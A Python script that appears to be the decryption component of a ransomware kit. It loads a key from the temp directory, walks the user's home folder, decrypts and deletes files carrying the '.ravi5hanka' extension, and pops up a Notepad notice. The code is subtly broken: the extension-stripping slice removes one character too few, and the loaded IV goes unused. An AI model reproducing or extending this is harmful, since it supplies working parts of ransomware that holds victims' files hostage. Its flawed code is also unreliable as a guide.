import os
import tempfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import subprocess

def load_key_iv():
    """Loads the encryption key and IV from a file in the temp directory."""
    temp_dir = tempfile.gettempdir()  # Get the system's temp directory
    key_file_path = os.path.join(temp_dir, "keyfile.bin")
    if not os.path.exists(key_file_path):
        print(f"Error: Key file not found at {key_file_path}. Cannot decrypt files.")
        return None, None
    with open(key_file_path, "rb") as key_file:
        data = key_file.read()
        key = data[:32]  # First 32 bytes are the key
        iv = data[32:]   # Next 16 bytes are the IV
    return key, iv

def decrypt_file(file_path, key, iv):
    """Decrypts a file using AES-256-CBC."""
    try:
        # Read the encrypted file content
        with open(file_path, 'rb') as encrypted_file:
            data = encrypted_file.read()
            file_iv = data[:16]  # First 16 bytes are the IV
            ciphertext = data[16:]  # Rest is the ciphertext

        # Decrypt the data
        cipher = Cipher(algorithms.AES(key), modes.CBC(file_iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()

        # Unpad the data
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        plaintext = unpadder.update(padded_data) + unpadder.finalize()

        # Write the decrypted data to a new file
        decrypted_file_path = file_path[:-10]  # Remove '.ravi5hanka' extension
        with open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_file.write(plaintext)

        # Remove the encrypted file
        os.remove(file_path)

        print(f"Decrypted: {file_path} -> {decrypted_file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

def decrypt_files_in_directory(directory, key, iv):
    """Decrypts all files with the .ravi5hanka extension in the specified directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith('.ravi5hanka'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key, iv)

def show_notepad_message(message):
    """Displays a Notepad window with the specified message."""
    try:
        with open("message.txt", "w") as f:
            f.write(message)
        subprocess.Popen(["notepad.exe", "message.txt"])
    except Exception as e:
        print(f"Error displaying Notepad message: {e}")

if __name__ == "__main__":
    # Get the current user's home directory (e.g., C:\Users\<Username>)
    user_home_directory = os.path.expanduser("~")

    # Load the encryption key and IV from the temp directory
    key, iv = load_key_iv()
    if key is None or iv is None:
        exit(1)

    # Decrypt files in the user's home directory
    print(f"Decrypting files in: {user_home_directory}")
    decrypt_files_in_directory(user_home_directory, key, iv)

    # Show the Notepad message after decryption
    show_notepad_message("Your Files have been decrypted!!!")
